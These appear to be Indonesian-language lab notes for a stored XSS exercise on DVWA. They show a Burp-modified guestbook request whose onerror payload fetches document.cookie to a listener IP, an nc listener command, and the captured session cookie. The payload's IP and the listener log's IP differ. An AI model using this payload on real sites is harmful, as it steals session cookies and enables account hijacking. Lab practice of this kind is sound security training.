## buka tampilan xss stored
## Submit form dengan data biasa (misal Name: a, Message: a)
## Request tertangkap (method POST):
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.68.107
...
txtName=a&mtxMessage=a&btnSign=Sign+Guestbook
## di burp, kirim request ke repeater 
## Ubah parameter txtName menjadi payload XSS yang ingin disimpan, ganti ke
```bash
txtName=a&mtxMessage=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2F192.168.68.112%3A9090%2F%3F%27%2Bdocument.cookie)%22%3E&btnSign=Sign+Guestbook
```
## di send 
## jalankan listener di kali
```bash
nc -lvnp 9090
```
## login kembali ke dvwa kemudian ke form xss stored
## di listener sudah ada cookiee atau flag seperti ini, 
connect to [192.168.68.115] from (UNKNOWN) [192.168.68.113] 63807
GET /?security=low;%20PHPSESSID=uaeld419u3drft3vfjgcqc65c2 HTTP/1.1
Host: 192.168.68.115:9090
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.68.107
Referer: http://192.168.68.107/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
x-dev-access: yes
